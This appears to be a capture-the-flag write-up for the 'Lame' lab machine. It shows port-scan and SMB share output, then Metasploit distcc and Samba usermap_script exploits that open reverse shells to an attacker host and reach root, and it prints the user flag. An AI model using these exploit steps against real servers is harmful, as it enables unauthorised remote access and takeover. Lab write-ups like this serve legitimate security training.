# Lame

## SYN Scan
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

## SMB Shares
```
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.3...
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	   NO ACCESS	Printer Drivers
	tmp                                               	   READ, WRITE	oh noes!
	opt                                               	   NO ACCESS	
	IPC$                                              	   NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                            	   NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
```

### tmp
```
drw-rw-rw-          0  Thu Mar 25 15:25:33 2021 .
drw-rw-rw-          0  Sat Oct 31 09:33:57 2020 ..
-rw-rw-rw-          0  Thu Mar 25 15:10:22 2021 5569.jsvc_up
drw-rw-rw-          0  Thu Mar 25 15:09:17 2021 .ICE-unix
drw-rw-rw-          0  Thu Mar 25 15:09:38 2021 vmware-root
drw-rw-rw-          0  Thu Mar 25 15:09:44 2021 .X11-unix
-rw-rw-rw-         11  Thu Mar 25 15:09:44 2021 .X0-lock
-rw-rw-rw-       1600  Thu Mar 25 15:09:14 2021 vgauthsvclog.txt.0
```

## Reverse SHELL
`distcc` is intended to be quite secure when used according to the documentation, but it must be properly configured.

**Anyone who can connect to the distcc server port can run arbitrary commands on that machine as the distccd user.**

`unix/misc/distcc_exec`

```
msf6 exploit(unix/misc/distcc_exec) > run

[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.3:39692) at 2021-03-25 15:42:56 +0300

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
``` 

## The User Flag
```
ls -l /home/makis/
total 4
-rw-r--r-- 1 makis makis 33 Mar 25 08:09 user.txt
cat /home/makis/user.txt
30bad5eb86ed98fc8278ccec36b0944e
```

## Privilege Escalation via Vulnerable Samba Version
`samba 3.0.20` is vulnerable.

`multi/samba/usermap_script`
```
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.3:55794) at 2021-03-25 16:34:16 +0300

id
uid=0(root) gid=0(root)
```
